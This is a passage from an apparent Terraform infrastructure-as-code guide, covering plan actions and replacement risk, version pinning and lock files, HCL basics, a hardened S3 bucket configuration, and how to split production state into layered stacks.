| `terraform destroy` | Plan a full teardown, then execute | **Yes** | **Yes** |
| `terraform show` | Renders state or a plan file | No | No |
| `terraform output` | Prints root module outputs | No | No |
| `terraform state *` | Direct state surgery | No | **Yes** |
| `terraform force-unlock` | Removes a lock | No | Removes lock only |

⚠️ **`terraform plan` is not perfectly read-only.** The refresh phase writes updated attribute values back to state. This is usually harmless, but it means plan requires write access to the state backend and takes the lock. If you want a truly read-only plan for a PR check, that is what `-refresh=false` gets you — at the cost of planning against possibly-stale data. Chapter 47 discusses the trade-off.

### 4.3 The five actions, and what causes each

| Symbol | Action | Cause |
|---|---|---|
| `+` | **create** | In config, not in state |
| `-` | **destroy** | In state, not in config |
| `~` | **update in place** | Attribute changed, and the provider can change it via an Update API call |
| `-/+` | **replace** (destroy then create) | Attribute changed that the provider marks `ForceNew` |
| `+/-` | **replace** (create then destroy) | Same, but with `create_before_destroy = true` |
| `<=` | **read** | A data source that will be read during apply |
| (no symbol) | **no-op** | Config matches actual |

🧠 **Replacement is the thing to fear.** `-/+` on an RDS instance means your production database will be deleted and a new empty one created. Chapter 57 teaches you to spot this, and Chapter 58 teaches you to prevent it.

Replacement happens because the provider's schema marks an attribute `ForceNew` — meaning the cloud API offers no way to change it on an existing resource. Examples: an EC2 instance's `availability_zone`, an RDS instance's `engine`, a subnet's `cidr_block`, an ECS task definition's `family`.

### 4.4 Reading a plan header

```
Terraform used the selected providers to generate the following execution plan.
Resource actions are indicated with the following symbols:
  + create
  ~ update in-place
-/+ destroy and then create replacement

Terraform will perform the following actions:

  # aws_db_instance.main must be replaced
-/+ resource "aws_db_instance" "main" {
      ~ engine_version  = "16.3" -> "17.2" # forces replacement
      ~ id              = "prod-api-db" -> (known after apply)
      ~ endpoint        = "prod-api-db.abc.ap-south-1.rds.amazonaws.com" -> (known after apply)
        # (48 unchanged attributes hidden)
    }

Plan: 1 to add, 0 to change, 1 to destroy.
```

Three things to read, in this order:

1. **The last line.** `1 to destroy` on a production plan demands an explanation.
2. **Every `must be replaced` header.** Find the `# forces replacement` comment to learn which attribute did it.
3. **`(known after apply)`** — Terraform cannot predict this value. Common and usually fine, but it hides information: if a security group ID is unknown, you cannot see what rules will result.

### 4.5 Why `terraform destroy` deserves its own warning

```mermaid
flowchart TD
    A["terraform destroy"] --> B["Build the graph, then REVERSE it"]
    B --> C["Destroy leaves first:<br/>ECS service, then task def,<br/>then target group, then ALB..."]
    C --> D["...down to the VPC"]
    D --> E{"prevent_destroy set<br/>on anything?"}
    E -->|"yes"| F["ERROR — plan refuses<br/>Good. This is the guardrail working"]
    E -->|"no"| G["Everything goes"]
```

⚠️ `terraform destroy` in a production directory is an outage. Protect against it:
- `lifecycle { prevent_destroy = true }` on databases, state buckets, KMS keys, Route53 zones.
- No human has apply credentials — only the CI role does (Chapter 46).
- The CI apply role has no `Delete*` permission on stateful resource types.
- 🔬 Terraform 1.16 / OpenTofu 1.12 add `lifecycle { destroy = false }`, which blocks destruction more thoroughly than `prevent_destroy`.

---

## Chapter 5 — Installation and Version Management

### 5.1 Why version management is not optional

Terraform state has a version stamp. **Once a newer Terraform writes your state, older versions refuse to read it.** If one engineer runs 1.16 and another runs 1.14, the second is now locked out until they upgrade. In CI this manifests as a confusing mid-pipeline failure.

Pin the version everywhere, and upgrade deliberately.

### 5.2 Version managers

**`tenv`** is the current recommendation — it handles Terraform, OpenTofu, Terragrunt and Atmos in one tool, and respects `.terraform-version`.

```bash
# macOS
brew install tenv

# Linux
curl -sSL https://github.com/tofuutils/tenv/releases/latest/download/tenv_Linux_x86_64.tar.gz \
  | sudo tar -xz -C /usr/local/bin tenv terraform tofu terragrunt
```

```bash
echo "1.16.4" > .terraform-version     # committed to the repo
tenv tf install                         # installs what the file says
terraform version                       # 1.16.4
```

`tfenv` is the older, Terraform-only equivalent and still works fine.

### 5.3 Declaring constraints in code

```hcl
terraform {
  # The CLI version. Pessimistic within a minor series.
  required_version = "~> 1.16.0"

  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 6.66"
    }
    google = {
      source  = "hashicorp/google"
      version = "~> 8.4"
    }
    kubernetes = {
      source  = "hashicorp/kubernetes"
      version = "~> 3.2"
    }
    helm = {
      source  = "hashicorp/helm"
      version = "~> 3.3"
    }
    random = {
      source  = "hashicorp/random"
      version = "~> 3.7"
    }
  }
}
```

**Constraint operators:**

| Operator | Example | Allows |
|---|---|---|
| `= 6.66.0` or `6.66.0` | exact | only that version |
| `>= 6.0` | minimum | 6.0 and anything newer, including 7.x ⚠️ |
| `~> 6.66` | pessimistic, minor | 6.66, 6.67, … but not 7.0 |
| `~> 6.66.0` | pessimistic, patch | 6.66.0, 6.66.1, … but not 6.67.0 |
| `>= 6.0, < 7.0` | range | explicit bound |

**Recommendation:**
- **Root modules** (the things you apply): `~> 6.66` on providers. Combined with a committed lock file, this gives reproducible builds plus easy patch upgrades.
- **Child modules** (things others consume): use the loosest constraint that is actually true, e.g. `>= 5.0`. A module that pins `= 6.66.0` is unusable alongside any module that pins differently.
- ⚠️ **Never use `>= x` alone in a root module.** A major provider release will land in your pipeline unannounced and break production.

### 5.4 The lock file

```hcl
# .terraform.lock.hcl — COMMIT THIS
provider "registry.terraform.io/hashicorp/aws" {
  version     = "6.66.0"
  constraints = "~> 6.66"
  hashes = [
    "h1:AbCdEf...",
    "zh:0123456789abcdef...",
  ]
}
```

This is Terraform's `package-lock.json`. It records the exact version *and* cryptographic checksums.

⚠️ **The multi-platform problem.** If you run `init` on an Apple Silicon Mac, the lock file records only `darwin_arm64` hashes. Your Linux CI runner then fails with a checksum mismatch. Fix:

```bash
terraform providers lock \
  -platform=linux_amd64 \
  -platform=linux_arm64 \
  -platform=darwin_arm64 \
  -platform=darwin_amd64
```

Run this whenever you add or upgrade a provider, and commit the result. Put it in a Makefile so nobody forgets.

### 5.5 Repository hygiene

```gitignore
# .gitignore
.terraform/
*.tfstate
*.tfstate.*
*.tfstate.backup
crash.log
crash.*.log
*.tfvars              # ⚠️ except examples — these often hold secrets
!example.tfvars
!*.auto.tfvars.example
override.tf
override.tf.json
*_override.tf
.terraformrc
terraform.rc
tfplan
*.tfplan
```

**Commit:** `*.tf`, `.terraform.lock.hcl`, `.terraform-version`, `*.tftest.hcl`, `README.md`.
**Never commit:** state files, plan files, `.tfvars` containing real values, provider binaries.

---

## Chapter 6 — HCL: The Language

### 6.1 The block structure

Everything in HCL is a block or an argument.

```hcl
block_type "label_one" "label_two" {
  argument = expression

  nested_block {
    other = value
  }
}
```

The top-level block types:

| Block | Labels | Purpose |
|---|---|---|
| `terraform` | none | Settings: version constraints, backend, providers |
| `provider` | name | Configure a provider |
| `resource` | type, name | **Create and manage** something |
| `data` | type, name | **Read** something that exists |
| `variable` | name | An input |
| `output` | name | An output |
| `locals` | none | Named intermediate values |
| `module` | name | Call a child module |
| `moved` | none | Declare a refactor (1.1+) |
| `import` | none | Declare an import (1.5+) |
| `removed` | none | Declare removal from state (1.7+) |
| `check` | name | A standalone assertion (1.5+) |
| `ephemeral` | type, name | A value that never enters state (1.10+) |
| `run` | name | A test step, in `.tftest.hcl` files (1.6+) |

### 6.2 Types

```hcl
# Primitives
string  "hello"
number  42        3.14
bool    true      false

# Collections — all elements the same type
list(string)    ["a", "b", "c"]          # ordered, duplicates allowed
set(string)     toset(["a", "b"])        # unordered, unique
map(string)     { key = "value" }        # string keys

# Structural — elements may differ
object({ name = string, port = number })
tuple([string, number, bool])

# Special
any        # avoid where you can
null       # explicitly unset — different from ""
```

⚠️ **`null` vs `""` vs omitted.** `null` tells Terraform "use the provider default". `""` is an actual empty string, which some APIs reject. Omitting an optional argument is the same as `null`.

### 6.3 References

```hcl
aws_vpc.main.id                        # resource attribute
module.networking.vpc_id               # module output
var.environment                        # input variable
local.common_tags                      # local value
data.aws_ami.ubuntu.id                 # data source attribute
each.key / each.value                  # inside for_each
count.index                            # inside count
self.private_ip                        # inside provisioners/connection only
path.module                            # directory of the current module
path.root                              # directory of the root module
terraform.workspace                    # current workspace name
```

### 6.4 String interpolation and heredocs

```hcl
name        = "${var.project}-${var.environment}-api"
description = "Managed by Terraform. Owner: ${var.team}"

policy = <<-EOT
  {
    "Version": "2012-10-17",
    "Statement": []
  }
EOT
```

⚠️ **Do not build JSON with string interpolation.** Use `jsonencode()` — it escapes correctly and fails loudly on malformed structures. For IAM specifically, use `data "aws_iam_policy_document"`, which gives you validation and better diffs.

```hcl
# ⚠️ INTENTIONALLY BAD EXAMPLE — fragile, unvalidated, breaks on special characters
resource "aws_iam_role" "bad" {
  assume_role_policy = "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":{\"Service\":\"${var.service}\"},\"Action\":\"sts:AssumeRole\"}]}"
}

# ✅ FIXED
data "aws_iam_policy_document" "assume" {
  statement {
    effect  = "Allow"
    actions = ["sts:AssumeRole"]
    principals {
      type        = "Service"
      identifiers = ["ecs-tasks.amazonaws.com"]
    }
  }
}

resource "aws_iam_role" "good" {
  name               = "${var.project}-${var.environment}-task"
  assume_role_policy = data.aws_iam_policy_document.assume.json
}
```

### 6.5 File organisation

Terraform loads **every `.tf` file in the directory** and concatenates them. File names are purely for humans. The convention:

```
terraform.tf     # terraform block: required_version, required_providers, backend
providers.tf     # provider blocks
variables.tf     # variable blocks
locals.tf        # locals
main.tf          # the resources
outputs.tf       # output blocks
versions.tf      # (alternative name for terraform.tf)
```

For anything non-trivial, split `main.tf` by concern: `network.tf`, `iam.tf`, `ecs.tf`, `rds.tf`.

⚠️ Order does not matter. Terraform resolves dependencies from the graph, not from file position. A resource on line 3 can reference one defined on line 300 of another file.

---

## Chapter 7 — Your First Real Configuration

Not a "hello world". A small but genuinely production-shaped configuration: an S3 bucket with the security controls a real review would demand.

### 7.1 The code

```hcl
# terraform.tf
terraform {
  required_version = "~> 1.16.0"

  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 6.66"
    }
  }
}
```

```hcl
# providers.tf
provider "aws" {
  region = var.aws_region

  # Applied to every taggable resource this provider manages.
  default_tags {
    tags = {
      Project     = var.project
      Environment = var.environment
      ManagedBy   = "terraform"
      Repository  = var.repository
    }
  }
}
```

```hcl
# variables.tf
variable "aws_region" {
  description = "AWS region for all resources"
  type        = string
  default     = "ap-south-1"
}

variable "project" {
  description = "Project name, used as a resource name prefix"
  type        = string

  validation {
    condition     = can(regex("^[a-z][a-z0-9-]{1,20}$", var.project))
    error_message = "project must be lowercase alphanumeric with hyphens, 2-21 characters, starting with a letter."
  }
}

variable "environment" {
  description = "Deployment environment"
  type        = string

  validation {
    condition     = contains(["dev", "staging", "production"], var.environment)
    error_message = "environment must be one of: dev, staging, production."
  }
}

variable "repository" {
  description = "Source repository, recorded in tags for traceability"
  type        = string
  default     = "my-org/infrastructure"
}

variable "log_retention_days" {
  description = "Days to retain objects in the logs prefix before expiry"
  type        = number
  default     = 90

  validation {
    condition     = var.log_retention_days >= 30
    error_message = "Retention must be at least 30 days for audit purposes."
  }
}
```

```hcl
# main.tf
locals {
  bucket_name = "${var.project}-${var.environment}-artifacts-${data.aws_caller_identity.current.account_id}"
}

data "aws_caller_identity" "current" {}

resource "aws_s3_bucket" "artifacts" {
  bucket = local.bucket_name

  lifecycle {
    prevent_destroy = true
  }
}

resource "aws_s3_bucket_public_access_block" "artifacts" {
  bucket                  = aws_s3_bucket.artifacts.id
  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}

resource "aws_s3_bucket_versioning" "artifacts" {
  bucket = aws_s3_bucket.artifacts.id
  versioning_configuration {
    status = "Enabled"
  }
}

resource "aws_s3_bucket_server_side_encryption_configuration" "artifacts" {
  bucket = aws_s3_bucket.artifacts.id
  rule {
    apply_server_side_encryption_by_default {
      sse_algorithm     = "aws:kms"
      kms_master_key_id = aws_kms_key.artifacts.arn
    }
    bucket_key_enabled = true
  }
}

resource "aws_kms_key" "artifacts" {
  description             = "Encryption key for ${local.bucket_name}"
  deletion_window_in_days = 30
  enable_key_rotation     = true

  lifecycle {
    prevent_destroy = true
  }
}

resource "aws_kms_alias" "artifacts" {
  name          = "alias/${var.project}-${var.environment}-artifacts"
  target_key_id = aws_kms_key.artifacts.key_id
}

resource "aws_s3_bucket_lifecycle_configuration" "artifacts" {
  bucket = aws_s3_bucket.artifacts.id

  rule {
    id     = "expire-logs"
    status = "Enabled"

    filter {
      prefix = "logs/"
    }

    expiration {
      days = var.log_retention_days
    }

    noncurrent_version_expiration {
      noncurrent_days = 30
    }
  }

  rule {
    id     = "abort-incomplete-uploads"
    status = "Enabled"

    filter {}

    abort_incomplete_multipart_upload {
      days_after_initiation = 7
    }
  }

  depends_on = [aws_s3_bucket_versioning.artifacts]
}

data "aws_iam_policy_document" "enforce_tls" {
  statement {
    sid    = "DenyInsecureTransport"
    effect = "Deny"

    principals {
      type        = "*"
      identifiers = ["*"]
    }

    actions = ["s3:*"]

    resources = [
      aws_s3_bucket.artifacts.arn,
      "${aws_s3_bucket.artifacts.arn}/*",
    ]

    condition {
      test     = "Bool"
      variable = "aws:SecureTransport"
      values   = ["false"]
    }
  }
}

resource "aws_s3_bucket_policy" "artifacts" {
  bucket = aws_s3_bucket.artifacts.id
  policy = data.aws_iam_policy_document.enforce_tls.json

  depends_on = [aws_s3_bucket_public_access_block.artifacts]
}
```

```hcl
# outputs.tf
output "bucket_name" {
  description = "Name of the artifacts bucket"
  value       = aws_s3_bucket.artifacts.id
}

output "bucket_arn" {
  description = "ARN of the artifacts bucket"
  value       = aws_s3_bucket.artifacts.arn
}

output "kms_key_arn" {
  description = "ARN of the KMS key encrypting the bucket"
  value       = aws_kms_key.artifacts.arn
}
```

### 7.2 Why it is shaped that way

**Why so many resources for one bucket?** The AWS provider deliberately split bucket configuration into separate resources (v4, 2022). It is more verbose but each concern diffs independently — changing the lifecycle rule no longer shows a diff on encryption. Old examples using inline `versioning {}` blocks inside `aws_s3_bucket` are for provider v3 and will not work.

**Why the account ID in the bucket name?** S3 bucket names are globally unique across all AWS customers. `my-app-production-artifacts` is almost certainly taken. Including the account ID makes collisions essentially impossible and makes the config reusable across accounts.

**Why `prevent_destroy` on the bucket and key?** Both are stateful and effectively irrecoverable. A KMS key deletion destroys the ability to decrypt everything encrypted with it. This is the cheapest insurance in Terraform.

**Why `enable_key_rotation`?** Annual automatic rotation, required by most compliance frameworks, zero operational cost.

**Why the TLS-enforcement bucket policy?** Without it, S3 accepts plaintext HTTP. Every IaC scanner flags its absence; more importantly it is a real exposure.

**Why `depends_on` on the lifecycle configuration and bucket policy?** S3 has eventual-consistency behaviours where applying a lifecycle rule before versioning is enabled, or a policy before the public access block, can fail or produce a wrong end state. These are explicit ordering constraints Terraform cannot infer, because the resources do not reference each other.

**Why `default_tags` on the provider rather than tags on each resource?** One place to change, applied consistently, and it cannot be forgotten on a new resource. Chapter 29 covers the caveats.

### 7.3 Security implications

| Control | What it stops |
|---|---|
| Public access block | The classic "open S3 bucket" data breach |
| SSE-KMS + key rotation | Data at rest readable from a stolen disk or snapshot; satisfies most compliance controls |
| Versioning | Accidental or malicious overwrites and deletes; enables recovery |
| TLS-only bucket policy | Credentials and data in transit over plaintext HTTP |
| `prevent_destroy` | `terraform destroy` or a bad refactor deleting your data |
| Lifecycle expiry | 💰 Unbounded storage growth, and retaining data longer than policy allows |

### 7.4 Failure modes you will hit

| Error | Cause | Fix |
|---|---|---|
| `BucketAlreadyExists` | Name taken globally | Add more entropy — account ID, region, or a `random_id` suffix |
| `AccessDenied` on the bucket policy | The public access block was applied first and blocks policy writes | Already handled by `depends_on` here; otherwise apply the policy before the block |
| `InvalidArgument: lifecycle filter` | Provider v6 requires an explicit `filter {}` block even when empty | Add `filter {}` |
| `KMSKeyNotFound` for a few seconds | KMS key creation is eventually consistent | Usually resolves on retry |
| Plan wants to destroy the bucket | You changed `var.project` or `var.environment`, which changes the name, which is `ForceNew` | `prevent_destroy` will block it. Rename deliberately with a `moved` block, or accept a new bucket and migrate data |

### 7.5 Run it

```bash
terraform init
terraform fmt -recursive
terraform validate
terraform plan -out=tfplan
terraform show tfplan            # read it properly before applying
terraform apply tfplan
terraform output
```

🧠 **Build the habit now: always `plan -out`, always read the plan, always `apply <planfile>`.** Applying a saved plan guarantees you execute exactly what you reviewed. Bare `terraform apply` re-plans and shows you a diff you then approve in a hurry — a meaningfully worse habit, and the one that causes "I didn't mean to destroy that" incidents.

---
# Part II — Production Stack Types

---

## Chapter 8 — Types of Terraform Stacks Used in Production

This chapter is deliberately early, because the most consequential Terraform decision you will make is **how to split your infrastructure into separately-applied units**, and that decision is hard to reverse.

### 8.1 What a "stack" is

A **stack** (also called a root module, a component, or a layer) is:

> A directory containing a `terraform` block with a backend configuration, which has **its own state file**, and which is planned and applied as an independent unit.

🧠 **The state file is the unit of blast radius.** Everything sharing one state can be destroyed by one bad apply, is locked by one lock, is slowed by one refresh, and is exposed by one leaked state file. Splitting state is the primary safety mechanism in Terraform.

### 8.2 The layered model

```mermaid
flowchart TD
    subgraph L0["Layer 0 — Bootstrap · changes: almost never · blast radius: TOTAL"]
        B1["State backend: S3 bucket + KMS key"]
        B2["OIDC providers, CI IAM roles"]
        B3["AWS Organizations, accounts, SCPs"]
    end
    subgraph L1["Layer 1 — Foundation / Landing Zone · changes: monthly · blast radius: whole account"]
        F1["VPC, subnets, routing, NAT, endpoints"]
        F2["Transit Gateway / peering"]
        F3["Route53 public + private zones"]
        F4["Baseline IAM roles, permission boundaries"]
        F5["CloudTrail, Config, GuardDuty"]
    end
    subgraph L2["Layer 2 — Shared Services · changes: monthly · blast radius: all apps in the account"]
        S1["ECR / Artifact Registry repositories"]
        S2["EKS or GKE cluster itself"]
        S3["Shared ALB, WAF, CDN"]
        S4["Central logging, Grafana, Prometheus"]
        S5["Shared KMS keys, Secrets Manager"]
    end
    subgraph L3["Layer 3 — Data / Stateful · changes: rarely · blast radius: IRRECOVERABLE"]
        D1["RDS / Cloud SQL instances"]
        D2["ElastiCache / Memorystore"]
        D3["S3 data buckets, DynamoDB tables"]
        D4["Kafka / MSK, OpenSearch"]
    end
    subgraph L4["Layer 4 — Application · changes: daily · blast radius: one service"]
        A1["ECS service + task definition"]
        A2["Target group, listener rules"]
        A3["Service IAM role"]
        A4["SQS queues, per-service S3 buckets"]
        A5["Alarms and dashboards for that service"]
    end
    subgraph L5["Layer 5 — Platform / in-cluster · changes: weekly · blast radius: cluster workloads"]
        P1["Helm releases: ingress-nginx, cert-manager,<br/>external-dns, ArgoCD, Karpenter"]
        P2["Namespaces, quotas, RBAC"]
    end

    L0 --> L1
    L1 --> L2
    L1 --> L3
    L2 --> L4
    L3 --> L4
    L2 --> L5
```

Dependencies point **downward only**. Layer 4 reads from Layer 1 and 3; Layer 1 never reads from Layer 4. If you find yourself wanting an upward dependency, your layering is wrong.

### 8.3 The stack catalogue

For each: what it is, how often it changes, what happens if it breaks, who owns it, how it is applied.

---

#### Stack type 1 — Bootstrap / Foundation

**What:** The things that must exist before Terraform can run at all — the state bucket, the KMS key protecting it, the OIDC identity provider, and the CI roles.

| Attribute | Value |
|---|---|
| Change frequency | Once, then almost never |
| Blast radius | **Total.** Lose this and you cannot run Terraform anywhere |
| Owner | Platform / the most senior infrastructure engineer |
| Applied by | **A human, locally, once.** Then CI for later changes |
| State | ⚠️ **Chicken-and-egg**: it creates its own backend |
| Depends on | Nothing |

**The chicken-and-egg problem and its solution:**

```hcl
# stacks/bootstrap/main.tf
# Applied FIRST with local state, then migrated into the bucket it created.

terraform {
  required_version = "~> 1.16.0"
  required_providers {
    aws = { source = "hashicorp/aws", version = "~> 6.66" }
  }

  # Commented out for the very first apply. Uncommented afterwards,
  # then `terraform init -migrate-state` moves local state into S3.
  # backend "s3" {
  #   bucket       = "acme-tfstate-123456789012"
  #   key          = "bootstrap/terraform.tfstate"
  #   region       = "ap-south-1"
  #   encrypt      = true
  #   kms_key_id   = "arn:aws:kms:ap-south-1:123456789012:alias/tfstate"
  #   use_lockfile = true
  # }
}

data "aws_caller_identity" "current" {}

resource "aws_kms_key" "tfstate" {
  description             = "Encrypts Terraform state"
  deletion_window_in_days = 30
  enable_key_rotation     = true
  lifecycle { prevent_destroy = true }
}

resource "aws_kms_alias" "tfstate" {
  name          = "alias/tfstate"
  target_key_id = aws_kms_key.tfstate.key_id
}

resource "aws_s3_bucket" "tfstate" {
  bucket = "acme-tfstate-${data.aws_caller_identity.current.account_id}"
  lifecycle { prevent_destroy = true }
}

resource "aws_s3_bucket_versioning" "tfstate" {
  bucket = aws_s3_bucket.tfstate.id
  versioning_configuration { status = "Enabled" }
}

resource "aws_s3_bucket_server_side_encryption_configuration" "tfstate" {
  bucket = aws_s3_bucket.tfstate.id
  rule {
    apply_server_side_encryption_by_default {
      sse_algorithm     = "aws:kms"
      kms_master_key_id = aws_kms_key.tfstate.arn
    }
    bucket_key_enabled = true
  }
}

resource "aws_s3_bucket_public_access_block" "tfstate" {
  bucket                  = aws_s3_bucket.tfstate.id
  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}

# Keep old state versions for a year — this is your state recovery window.
resource "aws_s3_bucket_lifecycle_configuration" "tfstate" {
  bucket = aws_s3_bucket.tfstate.id
  rule {
    id     = "expire-old-versions"
    status = "Enabled"
    filter {}
    noncurrent_version_expiration { noncurrent_days = 365 }
  }
  depends_on = [aws_s3_bucket_versioning.tfstate]
}
```

**Recommendation:** keep bootstrap deliberately tiny — under 100 lines. It is the one stack that cannot be recovered by re-running Terraform, so the less of it there is, the better. Everything else can live one layer up.

---

#### Stack type 2 — Network / Landing Zone

**What:** VPC, subnets, route tables, NAT gateways, VPC endpoints, DNS zones, and inter-VPC connectivity.

| Attribute | Value |
|---|---|
| Change frequency | Monthly at most; often quarterly |
| Blast radius | **Whole account.** Changing a subnet CIDR replaces the subnet, which replaces everything in it |
| Owner | Platform team |
| Applied by | CI, with required approval |
| Depends on | Bootstrap |
| Consumed by | Every other stack, via remote state or SSM |

⚠️ **The most expensive mistake in this stack:** changing `cidr_block` on a subnet. It is `ForceNew`. Terraform will plan to destroy the subnet — which requires destroying every ENI in it — which means your RDS instance, your ECS tasks and your load balancer. Plan network CIDRs generously at the start and never change them.

---

#### Stack type 3 — IAM / Identity

**What:** Roles, policies, permission boundaries, OIDC providers, SSO assignments, service accounts.

| Attribute | Value |
|---|---|
| Change frequency | Weekly |
| Blast radius | **Security-critical.** A wrong policy is either an outage or a breach |
| Owner | Platform + security review |
| Applied by | CI with mandatory security-team approval |
| Depends on | Bootstrap, Network (for VPC-scoped conditions) |

**Recommendation:** split IAM into two stacks — *foundational* IAM (CI roles, permission boundaries, break-glass roles) which changes rarely and needs heavy review, and *application* IAM (task roles) which lives with each application stack and changes with the service.

---

#### Stack type 4 — Shared Services

**What:** ECR repositories, the EKS/GKE cluster control plane, shared load balancers, WAF, CDN, central observability.

| Attribute | Value |
|---|---|
| Change frequency | Monthly |
| Blast radius | Every application in the account |
| Owner | Platform team |
| Applied by | CI with approval |
| Depends on | Network, IAM |

⚠️ The EKS/GKE **cluster** belongs here. The **workloads inside it** do not — see Chapter 38.

---

#### Stack type 5 — Data / Stateful

**What:** RDS, Aurora, ElastiCache, OpenSearch, MSK, DynamoDB, data buckets.

| Attribute | Value |
|---|---|
| Change frequency | Rarely — and every change is scrutinised |
| Blast radius | ⚠️ **Irrecoverable.** Deleting a database loses data. No `terraform apply` brings it back |
| Owner | Platform + the owning application team + DBA if you have one |
| Applied by | CI with **two** approvals and a change window |
| Depends on | Network, IAM, Shared Services (KMS) |

🧠 **Always give stateful resources their own state file, separate from the applications that use them.** The reasoning: application stacks are applied several times a day. Data stacks should be applied a few times a year. Sharing state means every routine application deploy carries the risk of a plan that touches your database.

Mandatory in this stack:

```hcl
lifecycle {
  prevent_destroy = true
  ignore_changes  = [
    # Passwords rotated outside Terraform
    password,
    # Snapshot identifier changes on restore
    snapshot_identifier,
  ]
}
```

---

#### Stack type 6 — Application Infrastructure

**What:** For one service: the ECS service and task definition, its target group and listener rule, its IAM task role, its queues, its alarms.

| Attribute | Value |
|---|---|
| Change frequency | **Daily**, sometimes hourly |
| Blast radius | One service |
| Owner | The application team |
| Applied by | CI, automatically on merge to main for dev/staging; approval for production |
| Depends on | Network, Shared Services, Data |

**Recommendation:** one stack per service per environment. `stacks/api/production/`, `stacks/worker/staging/`. This gives the smallest possible blast radius on the changes that happen most often, which is exactly the right trade.

⚠️ **Do not put the container image tag in Terraform.** Deploying a new version of your application should not require a Terraform apply. Use `ignore_changes` on the task definition image, or better, have Terraform define the service and let your deployment pipeline update the task definition directly. Chapter 32 shows both.

---

#### Stack type 7 — Platform / In-Cluster

**What:** Helm releases for cluster add-ons — ingress controller, cert-manager, external-dns, ArgoCD, Karpenter, the metrics stack.

| Attribute | Value |
|---|---|
| Change frequency | Weekly |
| Blast radius | All workloads in the cluster |
| Owner | Platform team |
| Applied by | CI with approval |
| Depends on | The cluster stack |

⚠️ This stack is **the most common source of Terraform pain in Kubernetes shops**, because of the provider-configuration problem (Chapter 38). Read that chapter before building it.

---

#### Stack type 8 — DNS

**What:** Route53 / Cloud DNS zones and records.

| Attribute | Value |
|---|---|
| Change frequency | Weekly |
| Blast radius | ⚠️ Deceptively large — a wrong record is a total outage, and TTLs delay recovery |
| Owner | Platform |
| Applied by | CI with approval |

**Recommendation:** put the **zones** in the network/foundation stack (they change almost never) and the **records** with the applications that own them, or delegate record management entirely to `external-dns` in Kubernetes.

---

#### Stack type 9 — Observability

**What:** Log groups, metric filters, alarms, dashboards, SLO definitions, notification channels.

| Attribute | Value |
|---|---|
| Change frequency | Weekly |
| Blast radius | Low directly, but **high indirectly** — broken alerting means you do not find out about the next incident |
| Owner | Shared |

---

### 8.4 The summary table

| # | Stack | Frequency | Blast radius | Own state? | Approval |
|---|---|---|---|---|---|
| 1 | Bootstrap | Never | Total | Yes (special) | Human, local |
| 2 | Network / Landing zone | Quarterly | Account-wide | Yes | Required |
| 3 | IAM foundational | Weekly | Security-critical | Yes | Security review |
| 4 | Shared services | Monthly | All apps | Yes | Required |
| 5 | Data / stateful | Rarely | **Irrecoverable** | Yes, per datastore | Two approvers + window |
| 6 | Application × env | Daily | One service | Yes, per service per env | Prod only |
| 7 | Platform / in-cluster | Weekly | Cluster workloads | Yes | Required |
| 8 | DNS | Weekly | Outage-level | Zones with network; records with apps | Required for zones |
| 9 | Observability | Weekly | Indirect | Yes or with apps | No |

### 8.5 How to decide whether two things share a state file

Ask these five questions. **Any single "yes" means split them.**

1. Do they change at meaningfully different frequencies? (An ECS service changes daily; a VPC quarterly.)
2. Do different teams own them?
3. Does one contain irrecoverable data and the other not?
4. Would a mistaken `destroy` of one be acceptable while the other would be a disaster?
5. Is the combined refresh time making plans slow? (Over ~5 minutes is a real productivity tax.)

And one question that argues for *merging*:

6. Do they change together almost every time? If yes, splitting them just means two PRs and two applies forever.

```mermaid
flowchart TD
    A["Two groups of resources"] --> B{"Different change<br/>frequency?"}
    B -->|"yes"| SPLIT["SPLIT into separate stacks"]
    B -->|"no"| C{"Different owning team?"}
    C -->|"yes"| SPLIT
    C -->|"no"| D{"One holds<br/>irrecoverable data?"}
    D -->|"yes"| SPLIT
    D -->|"no"| E{"Plan time > 5 min<br/>if combined?"}
    E -->|"yes"| SPLIT
    E -->|"no"| F{"Do they nearly always<br/>change together?"}
    F -->|"yes"| KEEP["KEEP TOGETHER<br/>splitting adds pure overhead"]
    F -->|"no"| SPLIT
```

### 8.6 The cost of splitting

Splitting is not free, and guides that treat it as an unqualified good are wrong:

- **Cross-stack dependencies become explicit and awkward** (Chapter 28). Reading a VPC ID from another state is more code than referencing it directly.
- **Ordering becomes your problem.** Terraform will not tell you that you must apply network before application.
- **More pipelines, more approvals, more places to look when something breaks.**
- **Refactoring across a state boundary is genuinely hard** — moving a resource between states requires `state mv` across files or a pull/push dance (Chapter 22).

**Recommendation for a small team starting out:** begin with **three stacks per environment** — `foundation` (network + IAM + shared), `data`, `application`. That is enough to protect the database and keep daily application changes fast, without drowning in cross-stack plumbing. Split further only when one of the five questions above starts genuinely hurting.

### 8.7 A worked layout

```
infrastructure/
├── stacks/
│   ├── bootstrap/                  # state bucket, KMS, OIDC, CI roles
│   ├── foundation/
│   │   ├── dev/
│   │   ├── staging/
│   │   └── production/             # VPC, IAM, ECR, shared KMS, Route53 zones
│   ├── data/
│   │   ├── dev/
│   │   ├── staging/
│   │   └── production/             # RDS, ElastiCache — prevent_destroy everywhere
│   ├── platform/
│   │   └── production/             # EKS cluster (if you use Kubernetes)
│   ├── platform-addons/
│   │   └── production/             # Helm releases — SEPARATE from the cluster stack
│   └── apps/
│       ├── api/
│       │   ├── dev/
│       │   ├── staging/
│       │   └── production/
│       └── worker/
│           ├── dev/
│           ├── staging/
│           └── production/
├── modules/
│   ├── vpc/
│   ├── ecs-service/
│   ├── rds-postgres/
│   └── observability/
└── .github/workflows/
```

Each leaf directory under `stacks/` is a root module with its own backend key:

```hcl
# stacks/apps/api/production/terraform.tf
terraform {
  backend "s3" {
    bucket       = "acme-tfstate-123456789012"
    key          = "apps/api/production/terraform.tfstate"
    region       = "ap-south-1"
    encrypt      = true
    kms_key_id   = "arn:aws:kms:ap-south-1:123456789012:alias/tfstate"
    use_lockfile = true
  }
}
```

🧠 **The state key mirrors the directory path.** This sounds trivial and is enormously valuable: given any state file in the bucket, you know instantly which directory produces it, and vice versa. Make it a rule.

---
# Part III — Core Language

---

## Chapter 9 — Providers

### 9.1 What a provider is

A provider is a plugin binary that translates Terraform's generic create/read/update/delete model into a specific API. It declares a **schema** — which resource types exist, what arguments each takes, which are required, which are computed, and crucially **which force replacement when changed**.

